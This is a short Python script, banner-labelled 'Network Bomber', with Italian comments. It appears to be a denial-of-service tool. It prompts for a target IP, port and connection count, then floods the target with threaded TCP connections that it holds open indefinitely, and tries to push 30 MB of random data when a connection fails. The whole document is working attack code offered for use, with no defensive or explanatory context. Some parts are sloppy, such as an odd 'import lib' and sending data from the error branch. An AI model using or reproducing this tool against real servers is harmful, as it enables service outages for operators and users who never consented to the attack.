import lib
import socket
import threading
import time
import random
TEXT = '''  _   _ ______ _________          ______  _____  _  __   ____   ____  __  __ ____  ______ _____  
 | \ | |  ____|__   __\ \        / / __ \|  __ \| |/ /  |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
 |  \| | |__     | |   \ \  /\  / / |  | | |__) | ' /   | |_) | |  | | \  / | |_) | |__  | |__) |
 | . ` |  __|    | |    \ \/  \/ /| |  | |  _  /|  <    |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
 | |\  | |____   | |     \  /\  / | |__| | | \ \| . \   | |_) | |__| | |  | | |_) | |____| | \ \ 
 |_| \_|______|  |_|      \/  \/   \____/|_|  \_\_|\_\  |____/ \____/|_|  |_|____/|______|_|  \_\
                                                                                                 
                                                                                                 '''
# Numero di connessioni simultanee
# Indirizzo e porta del server di destinazione
print(TEXT)
TARGET_HOST = input("Ip> ")
TARGET_PORT = int(input("Port> "))
NUM_CONNECTIONS = int(input("Connections> "))
dd = 30*1024*1024
extra_data = random._urandom(dd)

# Funzione che apre una connessione e la lascia aperta
def open_connection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_HOST, TARGET_PORT))
        # La connessione viene lasciata aperta e incompleta
        while True:
            time.sleep(1)
    except Exception as e:
        try:
            s.sendall(extra_data)
        except:
            s.close()
# Funzione principale che gestisce le connessioni
def manage_connections():
    while True:
        threads = []
        for _ in range(NUM_CONNECTIONS):
            t = threading.Thread(target=open_connection)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()
        print("Attacco finito.")

if __name__ == "__main__":
    manage_connections()
